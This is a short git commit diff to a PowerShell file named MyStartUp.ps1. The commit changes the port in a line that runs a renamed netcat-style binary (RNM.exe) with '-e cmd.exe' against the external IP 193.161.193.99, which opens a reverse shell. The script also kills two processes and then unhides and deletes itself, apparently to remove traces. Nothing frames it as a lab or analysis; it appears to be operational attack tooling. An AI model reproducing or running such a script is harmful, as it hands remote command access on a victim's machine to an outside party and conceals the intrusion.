f91b3587afb6ccc5aed97614b3832a8bfdccadac
fullcaletaxixth <153169287+fullcaletaxixth@users.noreply.github.com>
2024-02-19 22:54:13 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,6 +1,6 @@
 taskkill /F /IM testear.exe
 taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
-C:\Users\Public\RNM.exe -nv 193.161.193.99 29537 -e cmd.exe
+C:\Users\Public\RNM.exe -nv 193.161.193.99 48375 -e cmd.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
